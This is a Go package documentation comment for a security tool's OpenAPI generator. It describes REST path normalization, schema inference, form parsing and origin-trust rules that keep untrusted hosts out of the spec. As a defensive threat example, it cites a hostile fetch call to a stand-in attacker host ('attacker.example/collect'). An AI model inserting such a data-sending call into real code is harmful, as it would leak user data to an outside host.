// Copyright 2026 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Package rest generates OpenAPI 3.0 specifications from classified REST
// requests. It handles path normalization (collapsing /users/42 and /users/87
// into /users/{id}), dynamic-segment detection, context-aware parameter
// naming, and JSON schema inference from response bodies.
//
// Key components:
//   - [OpenAPIGenerator] produces a valid OpenAPI 3.0 document in YAML format.
//     [OpenAPIGenerator.TargetOrigin] is the origin the run can vouch for (the
//     resolved target origin, from --target-url or the capture's own HTML
//     page). The document's `servers` list and `info.title` derive from that
//     trusted origin plus dynamically observed hosts; an unprobed JS-static
//     candidate (crawl.IsJSStaticSource) may join `servers` only when it is
//     same-origin with it. A cross-origin JS-static host therefore can never
//     define the deliverable's identity — its bundle text was never fetched or
//     executed, so a hostile literal like
//     fetch("https://attacker.example/collect") must not be able to occupy
//     servers[0] or capture info.title by sorting first (SEC-BE-002, LAB-4992
//     review). Such a host is not silently relabelled either: the endpoints on
//     it keep their real origin via a per-operation `servers` override, so a
//     recovered path is never attributed to a host that does not serve it
//     (SEC-BE-001). Grouping is origin-aware (origin is part of the internal
//     endpointKey), so a group can never mix endpoints from different
//     origins and the override is always correct for its group; when two
//     groups' normalized path+method collide across origins, the colliding
//     group with the lowest trust rank deterministically wins that slot —
//     the primary origin first, then any other non-excluded origin, then an
//     excluded origin OR an origin of unknown provenance (the empty string —
//     crawl.CanonicalOrigin's result for a host-less literal such as
//     "https:/api/x", a single slash after the scheme, which is not an
//     authority marker) last, so neither an excluded nor an unknown-
//     provenance origin can ever win over a vouched one regardless of which
//     hostname (or lack thereof) sorts first (SEC-BE-002/TEST-001) — and the
//     suppressed group is recorded (not silently dropped) via the
//     `x-vespasian-collision-origins` extension on the winning operation.
//     static:html is deliberately NOT treated as JS-static here — the page
//     carrying the form was fetched over the wire during the crawl.
//   - [NormalizePathsWithNames] is the primary normalization entry point. It
//     accepts a population of observed paths and returns a map of input path
//     to template path, performing both single-path regex detection (UUIDs,
//     MongoDB ObjectIDs, numeric IDs, short hex hashes, base64/base64url
//     tokens) and, when opt-in slug detection is enabled via options
//     (mergeSlugs), observation-based slug detection across the population.
//     Known literals (`me`, `current`, `self`, `new`, `list`, `search`) are
//     preserved against all forms of parameterization.
//   - [NormalizePathWithNames] is a single-path convenience that performs
//     only the regex-detection pass; callers that have a population of
//     paths should prefer [NormalizePathsWithNames] so slug detection can
//     fire.
//   - Schema inference examines response JSON to generate OpenAPI schema
//     objects with depth and property guards.
//   - [ParseURLEncodedForm] and [ParseMultipartForm] parse request bodies for
//     application/x-www-form-urlencoded and multipart/form-data content types
//     respectively. File upload fields are represented as type: string,
//     format: binary. Text fields undergo type inference (integer, number,
//     boolean, string). Multiple observations for the same endpoint and
//     content-type are merged in buildOperation via per-content-type grouping,
//     unioning properties and promoting conflicting types to string.
package rest
